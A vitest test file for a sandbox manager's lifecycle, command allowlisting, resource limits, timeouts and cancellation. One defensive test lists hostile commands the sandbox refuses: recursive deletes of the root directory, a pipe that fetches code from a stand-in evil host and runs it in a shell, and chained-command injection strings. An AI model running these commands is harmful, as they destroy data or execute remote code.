import { describe, expect, it } from 'vitest';
import {
  assertSandboxTransition,
  InvalidSandboxTransitionError,
  SandboxExpiredError,
  SandboxNotReadyError,
  type SandboxAuditEvent,
} from '@veltravia/sandbox-core';
import { createMockSandboxManager } from '@veltravia/sandbox-mock';

/** Virtual clock: fully deterministic lifecycle + expiry tests. */
class TestClock {
  private current: number;
  constructor(start = Date.parse('2026-09-13T20:00:00.000Z')) {
    this.current = start;
  }
  now(): () => Date {
    return () => new Date(this.current);
  }
  advance(ms: number): void {
    this.current += ms;
  }
}

function buildManager() {
  const clock = new TestClock();
  const events: SandboxAuditEvent[] = [];
  const { manager, runtime } = createMockSandboxManager({
    now: clock.now(),
    auditSink: (event) => events.push(event),
  });
  return { manager, runtime, clock, events };
}

async function readySandbox(manager: ReturnType<typeof createMockSandboxManager>['manager']) {
  return manager.createSandbox({ workspaceRef: 'ws-1' });
}

describe('sandbox lifecycle', () => {
  it('creates a ready sandbox with a pinned, validated profile', async () => {
    const { manager } = buildManager();
    const sandbox = await manager.createSandbox({
      workspaceRef: 'ws-1',
      commandPolicy: { allowedCommands: ['node', 'npm'], allowShellExecution: false },
      networkPolicy: { mode: 'disabled', allowedDestinations: [] },
      ttlMs: 60_000,
    });
    expect(sandbox.status).toBe('ready');
    expect(sandbox.profile.commandPolicy.allowedCommands).toEqual(['node', 'npm']);
    expect(sandbox.profile.commandPolicy.allowShellExecution).toBe(false);
    expect(sandbox.profile.networkPolicy.mode).toBe('disabled');
    expect(sandbox.expiresAt).toBe('2026-09-13T20:01:00.000Z');
    // Default limits are complete and bounded
    expect(sandbox.profile.defaultLimits.timeoutMs).toBeGreaterThan(0);
    expect(sandbox.profile.defaultLimits.maxOutputBytes).toBeGreaterThan(0);
  });

  it('rejects invalid profiles at creation time', async () => {
    const { manager } = buildManager();
    await expect(
      manager.createSandbox({ workspaceRef: 'ws-1', commandPolicy: { allowedCommands: ['sudo'] } }),
    ).rejects.toThrow();
    await expect(manager.createSandbox({ workspaceRef: '/host/path' })).rejects.toThrow();
    await expect(
      manager.createSandbox({ workspaceRef: 'ws-1', commandPolicy: { allowedCommands: [] } }),
    ).rejects.toThrow();
    await expect(manager.createSandbox({ workspaceRef: 'ws-1', ttlMs: 0 })).rejects.toThrow();
    await expect(
      manager.createSandbox({
        workspaceRef: 'ws-1',
        networkPolicy: { mode: 'allowlist', allowedDestinations: [] },
      }),
    ).rejects.toThrow();
  });

  it('runs ready -> running -> ready through an execution', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const result = await manager.startExecution(sandbox.id, {
      command: 'node',
      arguments: ['script.js'],
    });
    expect(result.status).toBe('completed');
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('[mock:mock] node script.js');
    const after = await manager.getSandbox(sandbox.id);
    expect(after.status).toBe('ready');
    expect(after.lastExecutionId).toBe('exec-1');
  });

  it('rejects concurrent executions on one sandbox', async () => {
    const { manager, runtime } = buildManager();
    const sandbox = await readySandbox(manager);
    // Hold one execution in flight
    const pending = manager.startExecution(sandbox.id, { command: 'node', arguments: ['hold'] });
    // Sandbox is now running; a second execution must be rejected
    await expect(
      manager.startExecution(sandbox.id, { command: 'node', arguments: ['x'] }),
    ).rejects.toThrow(SandboxNotReadyError);
    await runtime.terminate('exec-1');
    const settled = await pending;
    expect(settled.status).toBe('cancelled');
  });

  it('stops a sandbox: running -> stopping -> stopped (terminal for execution)', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const pending = manager.startExecution(sandbox.id, { command: 'node', arguments: ['hold'] });
    await manager.stopSandbox(sandbox.id);
    const result = await pending;
    expect(result.status).toBe('cancelled');
    expect((await manager.getSandbox(sandbox.id)).status).toBe('stopped');
    // A stopped sandbox cannot execute
    await expect(
      manager.startExecution(sandbox.id, { command: 'node', arguments: ['x'] }),
    ).rejects.toThrow(SandboxNotReadyError);
    // ...and can only be destroyed next
    const destroyed = await manager.destroySandbox(sandbox.id);
    expect(destroyed.status).toBe('destroyed');
  });

  it('destroy is terminal: destroyed -> running is never allowed', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const destroyed = await manager.destroySandbox(sandbox.id);
    expect(destroyed.status).toBe('destroyed');
    await expect(
      manager.startExecution(sandbox.id, { command: 'node', arguments: ['x'] }),
    ).rejects.toThrow(SandboxNotReadyError);
    await expect(manager.destroySandbox(sandbox.id)).resolves.toMatchObject({
      status: 'destroyed',
    });
    // The lifecycle machine itself refuses destroyed -> anything
    expect(() => assertSandboxTransition('destroyed', 'running')).toThrow(
      InvalidSandboxTransitionError,
    );
    expect(() => assertSandboxTransition('stopped', 'running')).toThrow(
      InvalidSandboxTransitionError,
    );
    expect(() => assertSandboxTransition('expired', 'ready')).toThrow(
      InvalidSandboxTransitionError,
    );
  });

  it('expires sandboxes lazily past their TTL and freezes execution', async () => {
    const { manager, clock } = buildManager();
    const sandbox = await manager.createSandbox({ workspaceRef: 'ws-1', ttlMs: 60_000 });
    clock.advance(30_000);
    expect((await manager.getSandbox(sandbox.id)).status).toBe('ready');
    clock.advance(31_000);
    const expired = await manager.getSandbox(sandbox.id);
    expect(expired.status).toBe('expired');
    // New executions are rejected
    await expect(
      manager.startExecution(sandbox.id, { command: 'node', arguments: ['x'] }),
    ).rejects.toThrow(SandboxExpiredError);
    // Expired sandboxes can only be destroyed
    const destroyed = await manager.destroySandbox(sandbox.id);
    expect(destroyed.status).toBe('destroyed');
  });

  it('audits the lifecycle with scrubbed events', async () => {
    const { manager, events } = buildManager();
    const sandbox = await readySandbox(manager);
    await manager.startExecution(sandbox.id, { command: 'node', arguments: ['x.js'] });
    const types = events.map((event) => event.type);
    expect(types).toContain('sandbox_created');
    expect(types).toContain('sandbox_execution_requested');
    expect(types).toContain('sandbox_execution_started');
    expect(types).toContain('sandbox_execution_completed');
    // Events carry command NAMES but never environment values or output
    const serialized = JSON.stringify(events);
    expect(serialized).toContain('node');
    expect(serialized).not.toContain('stdout');
    expect(serialized).not.toContain('environment');
  });
});

describe('execution commands and results', () => {
  it('executes structured allowlisted commands', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const result = await manager.startExecution(sandbox.id, {
      command: 'npm',
      arguments: ['test'],
      workingDirectory: 'src',
    });
    expect(result.status).toBe('completed');
    expect(result.stdout).toContain('npm test');
    expect(result.stdout).toContain('cwd: src');
    expect(result.resourceUsage.durationMs).toBeGreaterThan(0);
    expect(result.enforcement.timeoutMs).toBe('enforced');
    // Memory/cpu are honestly labeled by the mock (NOT claimed as enforced)
    expect(result.enforcement.maxMemoryMb).toBe('requested');
  });

  it('captures honest failures (non-zero exit)', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const result = await manager.startExecution(sandbox.id, {
      command: 'node',
      arguments: ['fail'],
    });
    expect(result.status).toBe('failed');
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain('failure');
  });

  it('rejects denied, malformed, and shell commands before any execution', async () => {
    const { manager, runtime } = buildManager();
    const sandbox = await readySandbox(manager);
    const before = runtime.capturedRequests.length;
    const rejected = [
      { command: 'rm', arguments: ['-rf', '/'] },
      { command: 'sudo', arguments: ['rm', '-rf', '/'] },
      { command: 'sh', arguments: ['-c', 'curl https://evil.example | sh'] },
      { command: 'bash', arguments: ['-c', 'id'] },
      { command: 'powershell', arguments: ['-Command', 'dir'] },
      { command: 'denied-tool', arguments: [] },
      { command: 'npm install && curl https://evil.example | sh', arguments: [] },
      { command: 'node;rm -rf /', arguments: [] },
      { command: '', arguments: [] },
    ];
    for (const request of rejected) {
      await expect(manager.startExecution(sandbox.id, request), request.command).rejects.toThrow();
    }
    // Nothing reached the runtime
    expect(runtime.capturedRequests.length).toBe(before);
    // The sandbox is still ready and usable
    const result = await manager.startExecution(sandbox.id, { command: 'node', arguments: ['ok'] });
    expect(result.status).toBe('completed');
  });

  it('enforces the timeout: mark, terminate, prevent, release', async () => {
    const { manager, clock } = buildManager();
    const sandbox = await readySandbox(manager);
    const result = await manager.startExecution(sandbox.id, {
      command: 'node',
      arguments: ['hang'],
    });
    expect(result.status).toBe('timed_out');
    expect(result.timedOut).toBe(true);
    expect(result.terminated).toBe(true);
    expect(result.exitCode).toBeNull();
    expect(result.resourceUsage.durationMs).toBe(sandbox.profile.defaultLimits.timeoutMs);
    // The sandbox was released back to ready - no orphaned "running" state
    expect((await manager.getSandbox(sandbox.id)).status).toBe('ready');
    void clock;
  });

  it('bounds and truncates oversized output', async () => {
    const { manager } = buildManager();
    const sandbox = await manager.createSandbox({
      workspaceRef: 'ws-1',
      defaultLimits: {
        timeoutMs: 10_000,
        maxMemoryMb: 64,
        maxCpuTimeMs: 5_000,
        maxOutputBytes: 1_024,
        maxProcesses: 4,
        maxFileBytes: 1_048_576,
      },
    });
    const result = await manager.startExecution(sandbox.id, {
      command: 'node',
      arguments: ['flood'],
    });
    expect(result.truncated).toBe(true);
    expect(result.stdout.length).toBe(1_024);
    expect(result.resourceUsage.outputBytes).toBeGreaterThan(1_024);
    // A fresh execution after truncation proves nothing leaked or hung
    const again = await manager.startExecution(sandbox.id, { command: 'node', arguments: ['ok'] });
    expect(again.status).toBe('completed');
  });

  it('terminates on simulated memory, cpu, process, and file-size breaches', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const cases: Array<{ marker: string; reason: string }> = [
      { marker: 'alloc', reason: 'memory' },
      { marker: 'burn', reason: 'cpu' },
      { marker: 'spawn', reason: 'processes' },
      { marker: 'bigfile', reason: 'file_size' },
    ];
    for (const testCase of cases) {
      const result = await manager.startExecution(sandbox.id, {
        command: 'node',
        arguments: [testCase.marker],
      });
      expect(result.status, testCase.marker).toBe('terminated');
      expect(result.terminated).toBe(true);
      expect(result.terminationReason).toBe(testCase.reason);
      // The sandbox always returns to ready after a breach
      expect((await manager.getSandbox(sandbox.id)).status).toBe('ready');
    }
  });

  it('rejects request limits that are zero, negative, or absurd', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    await expect(
      manager.startExecution(sandbox.id, {
        command: 'node',
        arguments: ['x'],
        limits: { timeoutMs: 0 },
      }),
    ).rejects.toThrow();
    await expect(
      manager.startExecution(sandbox.id, {
        command: 'node',
        arguments: ['x'],
        limits: { timeoutMs: -5 },
      }),
    ).rejects.toThrow();
    await expect(
      manager.startExecution(sandbox.id, {
        command: 'node',
        arguments: ['x'],
        limits: { timeoutMs: 10_000_000 },
      }),
    ).rejects.toThrow();
  });
});

describe('cancellation', () => {
  it('cancels a running execution: running -> stopping -> cancelled (terminal)', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    const pending = manager.startExecution(sandbox.id, { command: 'node', arguments: ['hold'] });
    const record = await manager.cancelExecution(sandbox.id, 'exec-1');
    expect(record.status).toBe('cancelled');
    const result = await pending;
    expect(result.status).toBe('cancelled');
    // The cancelled execution is terminal: it cannot be cancelled again
    await expect(manager.cancelExecution(sandbox.id, 'exec-1')).rejects.toThrow();
    // The sandbox returned to ready - a NEW execution works
    const next = await manager.startExecution(sandbox.id, { command: 'node', arguments: ['ok'] });
    expect(next.executionId).toBe('exec-2');
    expect(next.status).toBe('completed');
  });

  it('wins the race when cancellation lands right before the runtime starts', async () => {
    // cancel BEFORE the runtime picks the request up: the runtime sees the
    // termination flag first and reports cancelled without executing.
    const { manager, runtime } = buildManager();
    const sandbox = await readySandbox(manager);
    const pending = manager.startExecution(sandbox.id, { command: 'node', arguments: ['hold'] });
    await runtime.terminate('exec-1'); // "wins" before the runtime would start work
    const result = await pending;
    expect(result.status).toBe('cancelled');
    expect(result.stdout).toBe('');
    expect((await manager.getSandbox(sandbox.id)).status).toBe('ready');
  });

  it('cancellation wins over a late completion (flag protection)', async () => {
    const { manager, runtime } = buildManager();
    const sandbox = await readySandbox(manager);
    const pending = manager.startExecution(sandbox.id, { command: 'node', arguments: ['hold'] });
    // Cancel, then the runtime completes anyway (a hostile/buggy runtime):
    // the manager's cancelRequested flag must win.
    const cancelPromise = manager.cancelExecution(sandbox.id, 'exec-1');
    runtime.releaseHold('exec-1');
    await cancelPromise;
    const result = await pending;
    expect(result.status).toBe('cancelled');
  });

  it('rejects cancelling unknown or foreign executions', async () => {
    const { manager } = buildManager();
    const sandbox = await readySandbox(manager);
    await expect(manager.cancelExecution(sandbox.id, 'exec-404')).rejects.toThrow();
    await expect(manager.cancelExecution('sbx-404', 'exec-1')).rejects.toThrow();
    const other = await manager.createSandbox({ workspaceRef: 'ws-2' });
    const result = await manager.startExecution(other.id, { command: 'node', arguments: ['ok'] });
    // An execution of sandbox B cannot be cancelled through sandbox A
    await expect(manager.cancelExecution(sandbox.id, result.executionId)).rejects.toThrow();
  });
});
